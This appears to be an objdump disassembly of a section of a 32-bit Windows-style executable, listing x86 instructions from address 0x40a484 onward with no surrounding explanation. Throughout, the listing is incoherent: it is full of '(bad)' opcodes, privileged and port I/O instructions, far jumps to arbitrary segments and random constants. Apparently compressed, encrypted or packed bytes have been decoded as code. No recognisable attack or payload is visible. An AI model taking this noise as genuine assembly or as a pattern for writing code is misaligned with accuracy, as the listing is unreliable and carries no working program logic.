  40a484:	ins    BYTE PTR es:[edi],dx
  40a485:	lods   eax,DWORD PTR ds:[esi]
  40a486:	or     edx,ebx
  40a488:	dec    eax
  40a489:	sub    DWORD PTR [ecx+0x18d5e7cf],ebx
  40a48f:	out    0x55,eax
  40a491:	pandn  mm7,mm4
  40a494:	jge    0x40a4cd
  40a496:	cmp    edi,DWORD PTR [edi+0x1f194299]
  40a49c:	mov    bl,0xca
  40a49e:	or     al,0xb8
  40a4a0:	pop    ss
  40a4a1:	fcmovu st,st(7)
  40a4a3:	add    al,0xb6
  40a4a5:	stos   BYTE PTR es:[edi],al
  40a4a6:	mov    esp,0x482118b5
  40a4ab:	test   DWORD PTR [ebx],ecx
  40a4ad:	pop    ebp
  40a4ae:	pop    esi
  40a4af:	mov    edx,0xea641b7c
  40a4b4:	cld    
  40a4b5:	push   ss
  40a4b6:	(bad)  
  40a4b8:	sti    
  40a4b9:	sbb    ebp,DWORD PTR [ebx-0x6f]
  40a4bc:	(bad)  
  40a4bd:	(bad)  
  40a4be:	in     al,dx
  40a4bf:	retf   0x7385
  40a4c2:	leave  
  40a4c3:	bound  edx,QWORD PTR [ecx]
  40a4c5:	pop    eax
  40a4c6:	sbb    al,0x63
  40a4c8:	jmp    0x7684:0xbdfa1374
  40a4cf:	dec    ebx
  40a4d0:	xchg   edx,eax
  40a4d1:	adc    eax,0x8aca35da
  40a4d6:	push   esi
  40a4d7:	pop    es
  40a4d8:	(bad)  
  40a4d9:	adc    bh,bl
  40a4db:	in     al,dx
  40a4dc:	and    bh,bl
  40a4de:	scas   al,BYTE PTR es:[edi]
  40a4df:	fisub  WORD PTR [ebp+0x11]
  40a4e2:	shl    DWORD PTR [ebp+0x51],1
  40a4e5:	das    
  40a4e6:	pop    ebx
  40a4e7:	sbb    ebp,DWORD PTR [esp+edx*1-0x29]
  40a4eb:	inc    edi
  40a4ec:	xor    BYTE PTR ds:0x4dfde3e2,ch
  40a4f2:	pop    ebx
  40a4f3:	loope  0x40a542
  40a4f5:	mov    edx,edx
  40a4f7:	mov    bl,0xa
  40a4f9:	fdivr  QWORD PTR [ecx]
  40a4fb:	mov    esp,0xacf0032f
  40a500:	and    DWORD PTR [edi+esi*2+0x3e],ebp
  40a504:	or     BYTE PTR [ebx],ah
  40a506:	adc    eax,0xb22948ba
  40a50b:	push   ss
  40a50c:	fldcw  WORD PTR [eiz*2-0x4d36b4c2]
  40a513:	xchg   esp,eax
  40a514:	jl     0x40a584
  40a516:	sub    DWORD PTR [edi],ecx
  40a518:	mov    edi,0x6a7fc7cd
  40a51d:	(bad)  
  40a51e:	into   
  40a51f:	mov    ds,WORD PTR [ebx]
  40a521:	in     al,0x13
  40a523:	addr16 cli 
  40a525:	xor    eax,0xedc6f987
  40a52a:	mov    ds:0xa6970d99,eax
  40a52f:	sub    DWORD PTR [ecx-0x66],ebp
  40a532:	xacquire xchg DWORD PTR [edi-0x2],ebx
  40a536:	sbb    bl,bh
  40a538:	jl     0x40a51b
  40a53a:	adc    bl,BYTE PTR [ebx-0x59]
  40a53d:	sahf   
  40a53e:	bound  esi,QWORD PTR [ebx-0x5]
  40a541:	sbb    al,0x1b
  40a543:	fwait
  40a544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a545:	dec    eax
  40a546:	rcr    DWORD PTR [esi+0x7d],cl
  40a549:	enter  0x472e,0x58
  40a54d:	dec    esp
  40a54e:	aad    0xf9
  40a550:	loop   0x40a571
  40a552:	mov    edx,DWORD PTR [edi]
  40a554:	push   ebp
  40a555:	mov    ebp,0xae5cbd72
  40a55a:	inc    esi
  40a55b:	push   es
  40a55c:	push   esi
  40a55d:	pop    eax
  40a55e:	cdq    
  40a55f:	adc    eax,0xf86fed
  40a564:	mov    WORD PTR [esi],?
  40a566:	je     0x40a5a2
  40a568:	push   ebx
  40a569:	xchg   edi,eax
  40a56a:	inc    ebx
  40a56b:	xchg   edx,eax
  40a56c:	sbb    eax,0x4700026d
  40a571:	cdq    
  40a572:	add    BYTE PTR [edi+0x72],ch
  40a575:	lahf   
  40a576:	push   edi
  40a577:	add    ecx,DWORD PTR [edx+0xc38e5]
  40a57d:	shr    BYTE PTR [esi],0x53
  40a580:	xor    al,0x89
  40a582:	dec    esp
  40a583:	pop    edx
  40a584:	mov    WORD PTR [edi-0x22],gs
  40a587:	test   al,0x7a
  40a589:	clc    
  40a58a:	push   ebp
  40a58b:	pop    esi
  40a58c:	(bad)  
  40a58e:	ins    BYTE PTR es:[edi],dx
  40a58f:	js     0x40a5b8
  40a591:	jb     0x40a5ba
  40a593:	jo     0x40a5fd
  40a595:	add    al,0x9d
  40a598:	inc    eax
  40a599:	and    eax,0xd68b16de
  40a59e:	call   0x8e3e:0xf23cf22
  40a5a5:	mov    esi,0x86b5852b
  40a5aa:	sub    edx,DWORD PTR [edi+0x6e]
  40a5ad:	arpl   bp,sp
  40a5af:	jbe    0x40a546
  40a5b1:	add    al,0x24
  40a5b3:	inc    ebp
  40a5b4:	sbb    cl,dh
  40a5b6:	push   ss
  40a5b7:	(bad)  
  40a5b8:	and    eax,0xad84e3f8
  40a5bd:	cmp    ah,ah
  40a5bf:	ror    dl,1
  40a5c1:	sbb    al,0xb3
  40a5c3:	pop    ss
  40a5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5c5:	mov    DWORD PTR [edx+0x77684dd7],esp
  40a5cb:	adc    al,0x49
  40a5cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5ce:	leave  
  40a5cf:	dec    ebp
  40a5d0:	in     al,0x68
  40a5d2:	or     edx,DWORD PTR [edx]
  40a5d4:	(bad)  
  40a5d5:	(bad)  
  40a5d6:	xchg   edi,eax
  40a5d7:	xchg   edx,eax
  40a5d8:	js     0x40a59c
  40a5da:	cmp    DWORD PTR [ebx+0x2bbf715a],ebp
  40a5e0:	adc    dl,cl
  40a5e2:	xor    al,0x21
  40a5e4:	and    ah,BYTE PTR [edi+0x63]
  40a5e7:	int    0xbe
  40a5e9:	(bad)  
  40a5ea:	jge    0x40a5ed
  40a5ec:	loope  0x40a60a
  40a5ee:	xchg   esi,eax
  40a5ef:	inc    ebp
  40a5f0:	or     edx,DWORD PTR [edi]
  40a5f2:	rol    edi,1
  40a5f4:	jmp    FWORD PTR [esi+0x3eea9bca]
  40a5fa:	sub    eax,0xca1a5d16
  40a5ff:	pop    esp
  40a600:	push   ebx
  40a601:	in     al,0x5
  40a603:	inc    ebp
  40a604:	sahf   
  40a605:	xchg   edx,eax
  40a606:	sub    DWORD PTR [bx-0x5045],eax
  40a60b:	repz xchg ecx,eax
  40a60d:	mul    DWORD PTR [edi]
  40a60f:	pushf  
  40a610:	cmp    DWORD PTR [ebp+0x77ff7b5d],edi
  40a616:	jmp    0x40a60d
  40a618:	inc    ebx
  40a619:	add    dl,BYTE PTR [eax-0x28]
  40a61c:	sahf   
  40a61d:	and    al,0x9
  40a61f:	mov    ebp,0x5f178f5e
  40a624:	jl     0x40a5af
  40a626:	das    
  40a627:	jge    0x40a60e
  40a629:	inc    ebp
  40a62a:	mov    edx,0xdad987c3
  40a62f:	jns    0x40a5c1
  40a631:	loope  0x40a619
  40a633:	imul   edi,DWORD PTR [edx],0x54c20d9d
  40a639:	fdivrp st(1),st
  40a63b:	sub    edx,DWORD PTR [ebx]
  40a63d:	ficom  WORD PTR [esi-0x71]
  40a640:	mov    bh,0x55
  40a642:	mov    ch,0xb5
  40a644:	retf   0x82c2
  40a647:	and    eax,0xeb655ec5
  40a64c:	push   edi
  40a64d:	scas   al,BYTE PTR es:[edi]
  40a64e:	nop
  40a64f:	inc    esi
  40a650:	in     eax,dx
  40a651:	xchg   DWORD PTR [eax],ecx
  40a653:	nop
  40a654:	mov    esi,esp
  40a656:	add    dl,ah
  40a658:	ds pop es
  40a65a:	mov    al,ds:0xa6c48495
  40a65f:	in     eax,0xec
  40a661:	mov    edi,0x72c3df0
  40a666:	mov    dh,0x22
  40a668:	fwait
  40a669:	cmc    
  40a66a:	retf   0xfdaf
  40a66d:	fisubr DWORD PTR [edi-0x86f23cb]
  40a673:	dec    edi
  40a674:	mov    es,WORD PTR [ebx]
  40a676:	add    BYTE PTR [edx],ah
  40a678:	and    BYTE PTR [edi+0x6d],dl
  40a67b:	inc    eax
  40a67c:	xchg   BYTE PTR [eax+0x23],dh
  40a67f:	mov    edi,0x95af5d0a
  40a684:	adc    BYTE PTR [edx+0x63eb6309],ch
  40a68a:	je     0x40a6c7
  40a68c:	stos   BYTE PTR es:[edi],al
  40a68d:	idiv   DWORD PTR [edi-0x45]
  40a690:	mov    dh,0xfc
  40a692:	popf   
  40a693:	in     al,0xb8
  40a695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a696:	inc    eax
  40a697:	mov    ds:0x20516514,al
  40a69c:	arpl   WORD PTR [edi],bx
  40a69e:	xor    BYTE PTR [edi+0x3e],0xcd
  40a6a2:	out    0x73,eax
  40a6a4:	scas   al,BYTE PTR es:[edi]
  40a6a5:	pop    ebp
  40a6a6:	fwait
  40a6a7:	cmp    BYTE PTR [eax],0x85
  40a6aa:	inc    eax
  40a6ab:	mov    al,ds:0xf9454494
  40a6b0:	or     esi,eax
  40a6b2:	iret   
  40a6b3:	xor    al,0xec
  40a6b5:	xchg   edx,eax
  40a6b6:	jnp    0x40a6ce
  40a6b8:	out    0xad,eax
  40a6ba:	sub    DWORD PTR [ecx-0x102e3f8b],edx
  40a6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6c1:	hlt    
  40a6c2:	mov    ebx,0x4969d309
  40a6c7:	pop    ecx
  40a6c8:	pop    edx
  40a6c9:	mov    WORD PTR [esi-0x2ee3735f],fs
  40a6cf:	push   edx
  40a6d0:	ret    
  40a6d1:	stc    
  40a6d2:	loop   0x40a732
  40a6d4:	aas    
  40a6d5:	hlt    
  40a6d6:	loop   0x40a676
  40a6d8:	mov    bh,0x6c
  40a6db:	mov    ds:0xc6a9da72,al
  40a6e0:	mov    cl,0x2b
  40a6e2:	cmp    al,0x65
  40a6e4:	adc    eax,0x17ef0450
  40a6e9:	sub    al,0x32
  40a6eb:	adc    bl,al
  40a6ed:	in     eax,0xc3
  40a6ef:	jne    0x40a74d
  40a6f1:	jns    0x40a68a
  40a6f3:	jmp    0x374a:0x2c41d6e3
  40a6fa:	push   ss
  40a6fb:	and    bl,cl
  40a6fd:	loope  0x40a75f
  40a6ff:	(bad)  
  40a700:	cmp    al,0xef
  40a702:	jg     0x40a6e4
  40a704:	and    BYTE PTR [edi],0x9f
  40a707:	js     0x40a6ab
  40a709:	pop    edx
  40a70a:	sub    BYTE PTR [ebx+0x44efb8d9],0xfb
  40a711:	add    eax,DWORD PTR [eax-0x816d6b5]
  40a717:	sti    
  40a718:	fdivr  QWORD PTR [eax-0x2206c87]
  40a71e:	cld    
  40a71f:	xor    ebp,DWORD PTR [eax-0x4f]
  40a722:	lds    ebp,FWORD PTR [ecx+0x370c73ad]
  40a728:	jbe    0x40a712
  40a72a:	mov    ah,0x86
  40a72c:	cwde   
  40a72d:	push   edx
  40a72e:	and    BYTE PTR [ecx+ebp*4-0x4d5756d7],al
  40a735:	jbe    0x40a6f9
  40a737:	leave  
  40a738:	loop   0x40a6d9
  40a73a:	mov    ch,0x82
  40a73c:	jne    0x40a734
  40a73e:	mov    edi,0x92686cc2
  40a743:	mov    cl,0xf8
  40a745:	dec    ebp
  40a746:	les    edi,FWORD PTR [edi+0xd1bd283]
  40a74c:	cmp    al,BYTE PTR [ebx]
  40a74e:	cmp    eax,0x7a0a7283
  40a753:	cmp    al,0x67
  40a755:	out    0xd1,eax
  40a757:	xchg   esp,eax
  40a758:	and    al,0x49
  40a75a:	xor    DWORD PTR [esi],esp
  40a75c:	pop    ebx
  40a75d:	repnz inc bh
  40a760:	iret   
  40a761:	jle    0x40a7b7
  40a763:	adc    dl,al
  40a765:	rol    BYTE PTR [ecx],cl
  40a767:	not    DWORD PTR [ecx-0x72]
  40a76a:	arpl   WORD PTR [edx],ax
  40a76c:	pushf  
  40a76d:	push   ss
  40a76e:	inc    edx
  40a76f:	mov    ah,0x57
  40a771:	cmc    
  40a772:	loop   0x40a7cd
  40a774:	scas   al,BYTE PTR es:[edi]
  40a775:	sub    DWORD PTR [edx-0x61],ecx
  40a778:	ret    0x5388
  40a77b:	test   cl,bh
  40a77d:	jl     0x40a7cd
  40a77f:	scas   eax,DWORD PTR es:[edi]
  40a780:	xlat   BYTE PTR ds:[ebx]
  40a781:	inc    edi
  40a782:	sub    edi,esi
  40a784:	repnz div edi
  40a787:	imul   ecx
  40a789:	cmc    
  40a78a:	jp     0x40a741
  40a78c:	jecxz  0x40a71c
  40a78e:	sbb    esp,DWORD PTR [esi+0x4826555b]
  40a794:	mov    bl,0x4c
  40a796:	ins    BYTE PTR es:[edi],dx
  40a797:	or     bl,ah
  40a799:	test   eax,0x7f298ff7
  40a79e:	clc    
  40a79f:	scas   al,BYTE PTR es:[edi]
  40a7a0:	lea    eax,[ecx+0x6]
  40a7a3:	dec    eax
  40a7a4:	idiv   DWORD PTR [ebp-0x1d2a549a]
  40a7aa:	retf   0xb7d5
  40a7ad:	fcomp  st(5)
  40a7af:	ja     0x40a77b
  40a7b1:	and    eax,0xe0123e04
  40a7b6:	iret   
  40a7b7:	addr16 push ss
  40a7b9:	cmp    eax,0x6621158e
  40a7be:	pmaddwd mm6,mm7
  40a7c1:	in     eax,dx
  40a7c2:	jp     0x40a812
  40a7c4:	add    DWORD PTR [ebx+edi*1-0x76],esi
  40a7c8:	loope  0x40a77a
  40a7ca:	(bad)
  40a7cd:	and    bl,cl
  40a7cf:	xor    eax,0x60673579
  40a7d4:	call   0x7e90ff36
  40a7d9:	jmp    0x40a770
  40a7db:	xor    DWORD PTR [eax],ebp
  40a7dd:	imul   edx,DWORD PTR [ebp-0x62],0x15
  40a7e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7e2:	inc    eax
  40a7e3:	mov    ds:0x7fc38fa7,eax
  40a7e8:	xor    eax,0xd92363a7
  40a7ed:	daa    
  40a7ee:	div    dl
  40a7f0:	push   edi
  40a7f1:	cmp    al,0x3a
  40a7f3:	push   es
  40a7f4:	add    DWORD PTR [ecx],edx
  40a7f6:	add    DWORD PTR [eax+0x6b40acf],0x30285c6d
  40a800:	retf   
  40a801:	or     al,0xb3
  40a803:	fld    DWORD PTR [ecx]
  40a805:	out    0xb6,eax
  40a807:	scas   eax,DWORD PTR es:[edi]
  40a808:	icebp  
  40a809:	ror    DWORD PTR [edi],1
  40a80b:	mov    edi,0x5dbb7687
  40a810:	dec    ebp
  40a811:	jo     0x40a7c4
  40a813:	jmp    0x413:0x4159367d
  40a81a:	(bad)  
  40a81c:	ss repz stc 
  40a81f:	pushf  
  40a820:	(bad)  
  40a821:	cld    
  40a822:	mov    ecx,0x86e5732f
  40a827:	in     eax,0xcc
  40a829:	mov    ecx,0x4f0e1987
  40a82e:	shr    ebx,1
  40a830:	outs   dx,DWORD PTR ds:[esi]
  40a831:	cmp    DWORD PTR [esi+0x70ceb157],esi
  40a837:	outs   dx,DWORD PTR ds:[esi]
  40a838:	mov    ebp,DWORD PTR [edx]
  40a83a:	test   al,0xba
  40a83c:	out    dx,eax
  40a83d:	clc    
  40a83e:	jp     0x40a7cb
  40a840:	or     edx,edi
  40a842:	mov    bh,0x35
  40a844:	call   0x49b4:0x72fa5898
  40a84b:	popa   
  40a84c:	in     eax,dx
  40a84d:	and    bh,bh
  40a84f:	(bad)  
  40a851:	std    
  40a852:	outs   dx,BYTE PTR ds:[esi]
  40a853:	xor    DWORD PTR [eax+0x165d00a2],edx
  40a859:	or     al,0x7
  40a85b:	lods   eax,DWORD PTR ds:[esi]
  40a85c:	lds    edi,FWORD PTR [edx+edx*4+0x28193976]
  40a863:	mov    WORD PTR [ecx+0x381cb158],es
  40a869:	mov    esp,0xc4818b0b
  40a86e:	jb     0x40a88c
  40a870:	add    BYTE PTR [eax+0x11],ch
  40a873:	jmp    0xe3de:0x951c61aa
  40a87a:	sbb    esp,DWORD PTR [esp+ecx*2]
  40a87d:	mov    esi,0xefc5b4d1
  40a882:	xchg   esi,eax
  40a883:	scas   eax,DWORD PTR es:[edi]
  40a884:	movq   mm3,QWORD PTR [edi]
  40a887:	adc    al,0xee
  40a889:	xor    eax,0xfda7707a
  40a88e:	(bad)  
  40a88f:	sbb    BYTE PTR [edx],cl
  40a891:	arpl   WORD PTR [eax],bp
  40a893:	repnz pushf 
  40a895:	xor    al,0x4d
  40a897:	pop    ebp
  40a898:	scas   al,BYTE PTR es:[edi]
  40a899:	mov    ecx,0x695a89ef
  40a89e:	retf   0x9bad
  40a8a1:	sti    
  40a8a2:	sbb    al,0x1e
  40a8a4:	add    BYTE PTR [edx],dh
  40a8a6:	dec    esp
  40a8a7:	add    ah,dl
  40a8a9:	jge    0x40a8ab
  40a8ab:	(bad)  
  40a8ac:	mov    edi,0x1c45d8d8
  40a8b1:	adc    al,0x4c
  40a8b3:	or     BYTE PTR [edi-0x3],cl
  40a8b6:	pop    esp
  40a8b7:	(bad)  
  40a8b8:	sbb    al,0x1c
  40a8ba:	test   BYTE PTR [edx],ch
  40a8bc:	xchg   ecx,eax
  40a8bd:	je     0x40a8fa
  40a8bf:	or     DWORD PTR [ebp-0x5b1e3d92],edi
  40a8c5:	and    al,0xa7
  40a8c7:	fs in  eax,0x2a
  40a8ca:	ds push ebp
  40a8cc:	outs   dx,DWORD PTR ds:[esi]
  40a8cd:	push   ds
  40a8ce:	fbstp  TBYTE PTR [ebx-0x5d]
  40a8d1:	dec    esp
  40a8d2:	std    
  40a8d3:	or     DWORD PTR [ecx+0x50],ebx
  40a8d6:	cmc    
  40a8d7:	lock fld TBYTE PTR [esi+0x19871ed8]
  40a8de:	pop    ecx
  40a8df:	ss add eax,0x7e23ec6a
  40a8e5:	test   al,0xd8
  40a8e7:	and    al,0x71
  40a8e9:	or     eax,0x5aef5f17
  40a8ee:	mov    ebx,0xdddbd921
  40a8f3:	push   edi
  40a8f4:	clc    
  40a8f5:	hlt    
  40a8f6:	iret   
  40a8f7:	ds (bad) 
  40a8f9:	jmp    0xdd68d0d1
  40a8fe:	je     0x40a8c8
  40a900:	inc    edi
  40a901:	push   cs
  40a902:	aam    0x5a
  40a904:	lds    eax,FWORD PTR [eax]
  40a906:	ret    0x24ff
  40a909:	dec    ecx
  40a90a:	dec    eax
  40a90b:	xchg   edx,eax
  40a90c:	test   BYTE PTR [edi],bh
  40a90e:	cld    
  40a90f:	repnz xor edi,DWORD PTR [ebx+edi*8-0x45]
  40a914:	xlat   BYTE PTR ds:[ebx]
  40a915:	fnstcw WORD PTR [edx]
  40a917:	icebp  
  40a918:	and    al,0xc3
  40a91a:	int    0x53
  40a91c:	or     al,0xaa
  40a91e:	xor    al,0xdf
  40a920:	fcom   DWORD PTR [esi-0x67104572]
  40a926:	sub    al,0xe1
  40a928:	(bad)  
  40a929:	imul   eax,DWORD PTR [eax+eiz*8],0x33f036c7
  40a930:	or     al,0x6f
  40a932:	data16 loope 0x40a92b
  40a935:	mov    BYTE PTR [esi+0x37],bh
  40a938:	stos   DWORD PTR es:[edi],eax
  40a939:	jbe    0x40a8d0
  40a93b:	cmp    DWORD PTR [ecx],eax
  40a93d:	fimul  WORD PTR [ecx]
  40a93f:	test   al,0x3d
  40a941:	add    ecx,DWORD PTR [eax+0x66d680c2]
  40a947:	and    al,0xca
  40a949:	push   esp
  40a94a:	jae    0x40a99d
  40a94c:	mov    eax,0xe0db9663
  40a951:	jl     0x40a991
  40a953:	pop    edi
  40a954:	in     eax,0x24
  40a956:	mov    bh,0xbc
  40a958:	mov    edx,DWORD PTR [ecx]
  40a95a:	add    BYTE PTR [eax],bh
  40a95c:	sahf   
  40a95d:	or     DWORD PTR [eax-0x4],esp
  40a960:	inc    DWORD PTR [ebp-0x51]
  40a963:	or     DWORD PTR [eax-0x2d792f5b],eax
  40a969:	das    
  40a96a:	jne    0x40a980
  40a96c:	sub    dh,BYTE PTR [eax+0x15]
  40a96f:	mov    ebp,0x7707480b
  40a974:	mov    dh,0xe5
  40a976:	sbb    DWORD PTR [edi+esi*2],0x5f
  40a97a:	jae    0x40a957
  40a97c:	sub    dl,BYTE PTR [esi]
  40a97e:	jo     0x40a927
  40a980:	arpl   WORD PTR [ebp-0xb4d676c],sp
  40a986:	(bad)  [ebp+0x7f57357e]
  40a98c:	dec    DWORD PTR [ecx-0x66]
  40a98f:	jo     0x40a974
  40a991:	out    0x2d,al
  40a993:	push   cs
  40a994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a995:	ror    BYTE PTR ds:0x12e116e,cl
  40a99b:	sub    BYTE PTR [edx+ebx*1+0x1b87426c],ch
  40a9a2:	out    dx,al
  40a9a3:	bswap  edi
  40a9a5:	add    ch,BYTE PTR [edx]
  40a9a7:	pop    edi
  40a9a8:	inc    eax
  40a9a9:	add    BYTE PTR [eax],cl
  40a9ab:	pop    es
  40a9ac:	sub    BYTE PTR [edx-0x47],cl
  40a9af:	nop
  40a9b0:	pusha  
  40a9b1:	mov    bh,0x93
  40a9b3:	ror    BYTE PTR [edx+0x25],1
  40a9b6:	mov    bl,0xc
  40a9b8:	mov    edi,0x2868815e
  40a9bd:	call   0xeb9636a4
  40a9c2:	push   cs
  40a9c3:	xor    al,0x3d
  40a9c5:	jp     0x40a9d2
  40a9c7:	mov    ch,0x32
  40a9c9:	add    edx,0x23837ec7
  40a9cf:	sbb    DWORD PTR [edx+0x74],eax
  40a9d2:	into   
  40a9d3:	fucompp 
  40a9d5:	sbb    bh,BYTE PTR [esi+0x7d31a583]
  40a9db:	jne    0x40aa0d
  40a9dd:	xor    DWORD PTR [esi+0x60],eax
  40a9e0:	mov    ah,0x61
  40a9e2:	mov    bl,0x73
  40a9e4:	cdq    
  40a9e5:	pop    edi
  40a9e6:	cli    
  40a9e7:	dec    ebx
  40a9e8:	add    ebx,DWORD PTR [esi]
  40a9ea:	jle    0x40a9dc
  40a9ec:	fs aad 0xdb
  40a9ef:	lods   eax,DWORD PTR ds:[esi]
  40a9f0:	pop    edx
  40a9f1:	(bad)  
  40a9f2:	stos   DWORD PTR es:[edi],eax
  40a9f3:	cmp    cl,bl
  40a9f5:	adc    edi,ebx
  40a9f7:	xchg   ebp,eax
  40a9f8:	push   edx
  40a9f9:	mov    ah,0x5a
  40a9fb:	sub    eax,0xcbeefc5e
  40aa00:	jl     0x40a9f3
  40aa02:	(bad)  
  40aa03:	mov    esi,0x11e36f43
  40aa08:	inc    esi
  40aa09:	pop    ebx
  40aa0a:	sbb    BYTE PTR [si],cl
  40aa0d:	dec    edi
  40aa0e:	xchg   ecx,eax
  40aa0f:	mov    dh,0x17
  40aa11:	leave  
  40aa12:	mov    ds:0x77c47a8a,al
  40aa18:	mov    dh,0x42
  40aa1a:	jae    0x40aa3f
  40aa1c:	push   ebx
  40aa1d:	int3   
  40aa1e:	xchg   BYTE PTR [ebp+0x62],ch
  40aa21:	push   ecx
  40aa22:	(bad)  
  40aa23:	aad    0xa8
  40aa25:	test   DWORD PTR [eax+0x7d8b6f],edi
  40aa2b:	push   ecx
  40aa2c:	mov    ch,0xad
  40aa2e:	xchg   edx,eax
  40aa2f:	push   0x49
  40aa31:	jo     0x40a9ee
  40aa33:	mov    al,0xff
  40aa35:	dec    ebx
  40aa36:	or     eax,0x96ed2509
  40aa3b:	hlt    
  40aa3c:	mov    ?,ecx
  40aa3e:	sbb    BYTE PTR [eax-0x6b99b65e],dh
  40aa44:	bound  esi,QWORD PTR [edi+0x77]
  40aa47:	ja     0x40aa9e
  40aa49:	sbb    dh,BYTE PTR [eax+0x1]
  40aa4c:	pop    esp
  40aa4d:	pop    ecx
  40aa4e:	jge    0x40aa15
  40aa50:	sti    
  40aa51:	and    ebp,DWORD PTR [edi-0x75]
  40aa54:	add    DWORD PTR [esi+edi*1+0x0],edx
  40aa58:	scas   eax,DWORD PTR es:[edi]
  40aa59:	lock pop ecx
  40aa5b:	loope  0x40aaa9
  40aa5d:	cmp    BYTE PTR [eax-0xbef7b92],0x7a
  40aa64:	cmp    eax,0x28a12492
  40aa69:	or     ah,BYTE PTR [esi]
  40aa6b:	xchg   ebx,eax
  40aa6c:	or     DWORD PTR [ebx+0x2e9ee8d1],esp
  40aa72:	je     0x40aad0
  40aa74:	pop    edi
  40aa75:	rcr    BYTE PTR [ebp+0x4a77ff3c],0xe
  40aa7c:	push   0xffffff9e
  40aa7e:	dec    edi
  40aa7f:	or     BYTE PTR [ecx-0x17],al
  40aa82:	pop    es
  40aa83:	cmp    DWORD PTR [ecx+0x636a0873],eax
  40aa89:	call   0x6b598642
  40aa8e:	js     0x40aa73
  40aa90:	int    0xeb
  40aa92:	call   0xbbab3309
  40aa97:	clc    
  40aa98:	jg     0x40aa62
  40aa9a:	add    DWORD PTR [eax+0x4e100604],esi
  40aaa0:	jmp    0x810a:0x918a9a7a
  40aaa7:	fwait
  40aaa8:	sub    eax,eax
  40aaaa:	sub    DWORD PTR [edx+0x68],edx
  40aaad:	ins    BYTE PTR es:[edi],dx
  40aaae:	lods   eax,DWORD PTR ds:[esi]
  40aaaf:	mov    dh,0x4b
  40aab1:	pmaxsw mm3,QWORD PTR [esi]
  40aab4:	and    al,0x4c
  40aab6:	and    ax,0x3585
  40aaba:	pusha  
  40aabb:	jecxz  0x40ab36
  40aabd:	add    ah,BYTE PTR [edx+0xfa6fbfc]
  40aac3:	pusha  
  40aac4:	aad    0x1a
  40aac6:	xor    DWORD PTR ds:0x5dff805f,0xb
  40aacd:	or     esi,DWORD PTR [esi]
  40aacf:	fadd   DWORD PTR [ebx+esi*8+0x1c]
  40aad3:	push   ebp
  40aad4:	scas   eax,DWORD PTR es:[edi]
  40aad5:	out    dx,eax
  40aad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aad7:	adc    eax,0x1845cdaf
  40aadc:	fisttp DWORD PTR [esi]
  40aade:	jbe    0x40ab51
  40aae0:	mov    esp,0xd6b6414f
  40aae5:	rcl    BYTE PTR [esi+0x7],1
  40aae8:	jl     0x40aad0
  40aaea:	addr16 data16 cld 
  40aaed:	fsub   QWORD PTR [edi]
  40aaef:	jle    0x40aa93
  40aaf1:	mov    ds:0x70274dfe,al
  40aaf6:	nop
  40aaf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaf8:	shr    DWORD PTR [edi+0x4e9dfca9],cl
  40aafe:	xchg   DWORD PTR [ebx-0x69],ecx
  40ab01:	scas   al,BYTE PTR es:[edi]
  40ab02:	lock pop ds
  40ab04:	(bad)  
  40ab05:	repz push edi
  40ab07:	enter  0x16f5,0x67
  40ab0b:	mov    bh,0x1e
  40ab0d:	pusha  
  40ab0e:	xor    BYTE PTR [eax],bh
  40ab10:	inc    ebp
  40ab11:	stos   DWORD PTR es:[edi],eax
  40ab12:	mov    ebp,0xeab23181
  40ab17:	ins    BYTE PTR es:[edi],dx
  40ab18:	sub    dh,BYTE PTR [esi-0x3ce293d1]
  40ab1e:	push   esi
  40ab1f:	mov    dl,0x8d
  40ab21:	pop    edx
  40ab22:	or     esp,DWORD PTR [ebp+0x51]
  40ab25:	ins    BYTE PTR es:[edi],dx
  40ab26:	rcr    esp,0x16
  40ab29:	ins    DWORD PTR es:[edi],dx
  40ab2a:	mov    eax,ds:0xdfb5037a
  40ab2f:	cmc    
  40ab30:	adc    ebp,DWORD PTR [esi]
  40ab32:	stos   BYTE PTR es:[edi],al
  40ab33:	cmp    eax,0xfc28019e
  40ab38:	iret   
  40ab39:	or     ebp,eax
  40ab3b:	jbe    0x40ab69
  40ab3d:	addr16 iret 
  40ab3f:	in     al,dx
  40ab40:	push   eax
  40ab41:	xchg   esi,eax
  40ab42:	retf   
  40ab43:	adc    DWORD PTR [eax+0x534d3bf0],eax
  40ab49:	out    0xf3,al
  40ab4b:	stc    
  40ab4c:	sub    dl,BYTE PTR [ebx+0x617036f6]
  40ab52:	lds    edx,FWORD PTR [ebp-0x78e36411]
  40ab58:	add    DWORD PTR [edx+eax*1+0x2b2bc15a],ebx
  40ab5f:	mov    ds:0x3ca5deee,al
  40ab64:	cmp    ch,BYTE PTR [edx+0x65]
  40ab67:	mov    ebp,0xc179e5d2
  40ab6c:	push   0x854a42d4
  40ab71:	(bad)  
  40ab72:	jae    0x40ab1a
  40ab74:	shr    ecx,cl
  40ab76:	xchg   ecx,eax
  40ab77:	das    
  40ab78:	cld    
  40ab79:	popf   
  40ab7a:	mov    dl,0x0
  40ab7c:	mov    eax,0x788058f3
  40ab81:	lahf   
  40ab82:	jg     0x40ab1a
  40ab84:	xchg   ebp,eax
  40ab85:	mov    eax,es
  40ab87:	sbb    BYTE PTR [ebx+0x3e],al
  40ab8a:	lahf   
  40ab8b:	push   edi
  40ab8c:	imul   eax,DWORD PTR ds:0x3f309800,0xffffff9b
  40ab93:	xor    eax,0x87b4ba5c
  40ab98:	xor    eax,0x4821d75d
  40ab9d:	or     DWORD PTR [esp+eiz*2-0x5b],0x1acc2617
  40aba5:	loope  0x40ab3c
  40aba7:	fbstp  TBYTE PTR [ebp-0x3e]
  40abaa:	pop    esi
  40abab:	fld    DWORD PTR ds:0x46b16158
  40abb1:	jp     0x40ac13
  40abb3:	adc    BYTE PTR [eax-0x1d],bl
  40abb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abb7:	adc    ebp,edi
  40abb9:	je     0x40ac17
  40abbb:	dec    eax
  40abbc:	jo     0x40ac2d
  40abbe:	pop    edi
  40abbf:	push   eax
  40abc0:	push   0xffffffa7
  40abc2:	dec    eax
